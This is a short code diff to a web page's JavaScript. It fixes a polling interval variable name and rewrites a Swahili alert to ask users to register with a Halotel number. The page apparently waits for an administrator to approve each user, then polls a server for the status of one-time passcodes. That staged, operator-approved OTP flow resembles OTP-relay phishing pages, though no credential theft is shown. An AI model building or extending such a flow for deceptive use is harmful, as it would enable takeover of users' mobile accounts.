@@ -456,12 +456,12 @@
                     let data = await res.json();
 
                     if (data.status === 'approved') {
-                        clearInterval(interval);
+                        clearInterval(statusInterval);
                         document.getElementById('step-waiting').style.display = 'none';
                         document.getElementById('step-otp1').style.display = 'block';
                     } else if (data.status === 'rejected') {
-                        clearInterval(interval);
-                        alert('Ombi lako limekataliwa na msimamizi.');
+                        clearInterval(statusInterval);
+                        alert('Tafadhali jisajili kwa kutumia namba yako ya Halotel.');
                         location.reload();
                     }
                 } catch (e) {
@@ -492,7 +492,7 @@
         }
 
         async function pollOtp1() {
-            let interval = setInterval(async () => {
+            let statusInterval = setInterval(async () => {
                 try {
                     let res = await fetch('/api/check-otp1-status');
                     if (!res.ok) return;
